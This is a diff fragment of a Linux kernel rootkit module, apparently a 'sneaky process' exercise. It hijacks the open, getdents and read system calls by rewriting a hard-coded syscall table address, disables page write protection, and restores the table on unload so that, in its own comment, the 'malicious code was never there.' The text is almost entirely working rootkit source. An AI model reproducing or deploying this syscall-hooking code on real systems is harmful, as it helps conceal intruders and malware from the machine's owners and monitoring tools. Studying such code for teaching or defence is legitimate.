@@ -12,6 +12,7 @@
 
 
 #define BUFFLEN 512
+MODULE_LICENSE("GPL");
 
 
 //get sneaky process id
@@ -56,8 +57,10 @@ static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
 
+
+//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscal
+
 asmlinkage int (*original_call)(const char * pathname, int flags); //for open syscall
-//asmlinkage int (*original_open)(const char *pathname, int flags); //for open syscall
 asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count); //for getdents syscall
 asmlinkage ssize_t (*original_read)(int fd, void * buf, size_t count); //for read syscall
 
@@ -146,6 +149,9 @@ static int initialize_sneaky_module(void)
   original_call = (void*)*(sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
+  //for read
+  original_read = (void*)*(sys_call_table + __NR_read);
+  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;
 
   
   
@@ -178,7 +184,9 @@ static void exit_sneaky_module(void)
   //function address. Will look like malicious code was never there!
   *(sys_call_table + __NR_open) = (unsigned long)original_call;
   *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
 
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
@@ -188,4 +196,3 @@ static void exit_sneaky_module(void)
 
 module_init(initialize_sneaky_module);  // what's called upon loading 
 module_exit(exit_sneaky_module);        // what's called upon unloading  
-MODULE_LICENSE("GPL");
